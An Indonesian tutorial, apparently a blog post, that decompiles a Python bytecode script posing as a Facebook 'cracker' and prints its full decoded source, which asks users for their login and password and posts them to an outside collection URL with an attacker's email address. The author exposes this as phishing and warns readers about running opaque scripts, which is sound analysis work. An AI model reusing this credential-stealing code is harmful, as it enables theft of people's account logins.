
# Mengupas Script Phishing Sederhana

Tutorial singkat kali ini akan membahas sebuah script yang ditujukan untuk mencuri data penggunanya. Script tersebut bernama [fbtarget](https://github.com/Pain-Shinra-Tensei/fbtarget). Berikut ini adalah langkah-langkahnya:

* Pertama kita kloning dulu repositorinya:

```zsh
% git clone 'https://github.com/Pain-Shinra-Tensei/fbtarget'
Cloning into 'fbtarget'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), 4.62 KiB | 4.62 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```

* Selanjutnya kita akan pindah ke sub direktori repositori tersebut:

```zsh
% cd fbtarget
```

* Periksa tipe file yang ada pada repositori tersebut:

```zsh
% file *
fb.py:     python 2.7 byte-compiled
README.md: ASCII text
```

* Karena file `fb.py` tersebut tipenya adalah python bytecode, maka kita ganti ekstensinya menjadi `pyc`:

```zsh
% mv fb.py fb.pyc
```

* Jika kita menggunakan perintah `strings` untuk melihat _printable string_ pada python bytecode tersebut, maka hasilnya kurang lebih seperti ini:

```
% strings fb.pyc
IyBlcm9yIDUwNCByZXZl ... gogICAgbWFpbigp(
Falset
foot
bart
base64t
b64decode(
932257137o.pyt
<module>
```

* Bisa terlihat bahwa terdapat _printable string_ yang di-encode menggunakan base64. Kita dapat melakukan decode menggunakan perintah berikut ini:

```zsh
% echo -n "IyBlcm9yIDUwNCByZXZ ... gogICAgbWFpbigp" | base64 -d
```

* Hasilnya adalah sebagai berikut:

```python
# eror 504 reverse
import os, sys, time, random
try:
    import requests
except ImportError:
    os.system('pip2 install requests && python2 main.py')

a = '\x1b[1;30m'
m = '\x1b[1;31m'
h = '\x1b[1;32m'
k = '\x1b[1;33m'
b = '\x1b[1;34m'
u = '\x1b[1;35m'
c = '\x1b[1;36m'
p = '\x1b[1;37m'
n = '\x1b[0m'
logo = ('{}\n\t{}\xe2\x95\xad\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\xe2\x95\xae   \xe2\x95\xad\xe2\x94\x93\xe2\x95\xad\xe2\x94\x93   {}\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\n\t{}\xe2\x94\x8a\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xaf\xe2\x95\xaf   \xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x95\xae  {}\xe2\x94\x82 Dark Cracker {}V0.1 {}\xe2\x94\x82\n\t{} \xe2\x94\x83\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab\xe2\x95\xad{}\xe2\x96\x8b\xe2\x96\x8b{}\xe2\x94\x83  {}\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98\n\t{} \xe2\x94\x83\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x81\xe2\x95\xae      \xe2\x96\xbc\xe2\x94\x83 {}/     {}./Black{}Hat\n\t{} \xe2\x95\xb0\xe2\x94\x81\xe2\x94\xab \xe2\x94\x97\xe2\x94\x81\xe2\x95\xae \xe2\x94\x81\xe2\x95\xae\xe2\x95\xb0\xe2\x94\xbb\xe2\x94\xa3\xe2\x95\xae\n\t{}   \xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x9b\n\t{}=====================================\n').format(p, k, p, k, p, m, p, k, m, k, p, k, p, b, m, k, k, p)
imelku = 'agustinagries@gmail.com'
req = lambda url, data: requests.post(url, data=data)

def main():
    os.system('clear')
    print logo
    usr = raw_input(('{}\xe3\x80\x90{}\xe2\x97\x86{}\xe3\x80\x91{}Email/id/no {}: {}').format(p, b, p, h, k, p))
    psw = raw_input(('{}\xe3\x80\x90{}\xe2\x97\x86{}\xe3\x80\x91{}Password    {}: {}').format(p, b, p, h, k, p))
    print ('\n{}\xe3\x80\x90{}\xe2\x97\xaf{}\xe3\x80\x91{}Login...').format(p, b, p, h)
    time.sleep(3)
    print ('\n{}\xe3\x80\x90{}\xe2\x9c\x94{}\xe3\x80\x91{}Login Sukses! sedang Menyiapkan Menu').format(p, h, p, h)
    time.sleep(3)
    teks = ('\n<table border="1" cellpadding="5" bgcolor="black" width=100%>\n<tr>\n<th colspan="2"><center><font color="white">DATA AKUN HEKER BODOH:V</font></th>\n\n</tr>\n<tr>\n<td bgcolor="white"><center><b>Username</td>\n<td bgcolor="white"><center>{}</td>\n</tr>\n<tr>\n  <td bgcolor="white" width=30%><center><b>Password</b></td>\n  <td bgcolor="white"><center>{}</td>\n</tr>\n    ').format(usr, psw)
    web = 'http://savvymotherschool.com/files/post.php'
    data = {'from': '[!] Setoran Nya Bos', 'email_kamu': 'extremeboy@phising.net', 'email_target': imelku, 'subject': 'Ussername : ' + usr, 'mesage': teks}
    try:
        req(web, data)
    except requests.exceptions.ConnectionError:
        print ('{}\xe3\x80\x90{}\xe2\x9c\x96{}\xe3\x80\x91{}Periksa jaringan anda').format(p, m, p, h)

    menu()


def menu():
    os.system('clear')
    print logo
    grup = raw_input(('{}\xe3\x80\x90{}\xe2\x97\x86{}\xe3\x80\x91{}ID Grup {}: {}').format(p, b, p, h, k, p))
    tunggu = random.randint(0, 5)
    time.sleep(tunggu)
    print ('\n{}\xe3\x80\x90{}\xe2\x9c\x94{}\xe3\x80\x91{}Sukses! mengambil data member grup...\n').format(p, h, p, h)
    time.sleep(tunggu)
    dapat = random.randint(0, 99)
    for x in range(dapat):
        idmember = random.randint(0, 99999999999)
        cp = random.choice(['CP', 'OK'])
        pw = random.choice(['sayang', 'anonymous', 'freefire', 'indonesia', 'doraemon', '12345', '123456', 'ronaldo', 'anjing', 'cintaku'])
        print ('{}[{}').format(p, b) + cp + ('{}]{}').format(p, h), '1000' + str(idmember) + (' {}|{} ').format(p, h) + pw
        save = open('hasil.txt', 'w')
        save.write('Terjadi Error\n')
        save.close()
        jeda = random.randint(0, 9)
        time.sleep(jeda)

    print ('\n{}\xe3\x80\x90{}\xe2\x9c\x94{}\xe3\x80\x91{}Crack Sudah Sesesai').format(p, h, p, p)
    print ('{}Hasil Crack Di Simpan di : hasil.txt').format(p)
    ulang = raw_input(('{}Crack lg? y/n : {}').format(p, h))
    if ulang == 'y':
        os.system('python2 main.py')
    else:
        sys.exit(('{}\xe3\x80\x90{}!{}\xe3\x80\x91{}Program berhenti').format(p, m, p, h))


if __name__ == '__main__':
    main()
```

* Perhatikan fungsi `main` pada kode di atas, khususnya pada bagian ini:

```python
    teks = ('\n<table border="1" cellpadding="5" bgcolor="black" width=100%>\n<tr>\n<th colspan="2"><center><font color="white">DATA AKUN HEKER BODOH:V</font></th>\n\n</tr>\n<tr>\n<td bgcolor="white"><center><b>Username</td>\n<td bgcolor="white"><center>{}</td>\n</tr>\n<tr>\n  <td bgcolor="white" width=30%><center><b>Password</b></td>\n  <td bgcolor="white"><center>{}</td>\n</tr>\n    ').format(usr, psw)
    web = 'http://savvymotherschool.com/files/post.php'
    data = {'from': '[!] Setoran Nya Bos', 'email_kamu': 'extremeboy@phising.net', 'email_target': imelku, 'subject': 'Ussername : ' + usr, 'mesage': teks}
    try:
        req(web, data)
```

* Bagian tersebut akan mengirimkan/mengunggah informasi pengguna berupa **username** dan **password** ke tautan `http://savvymotherschool.com/files/post.php`. Jadi bagi rekan-rekan yang sering menggunakan script buatan orang lain dalam bentuk _python bytecode_ atau terenkripsi dan semacamnya, sebaiknya berhati-hati. Alasan penulis sering membongkar script yang berupa _python bytecode_ salah satunya adalah seperti yang ada pada tutorial ini, yaitu untuk mencari kemungkinan adanya unsur _backdoor_ atau _phising_.


Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
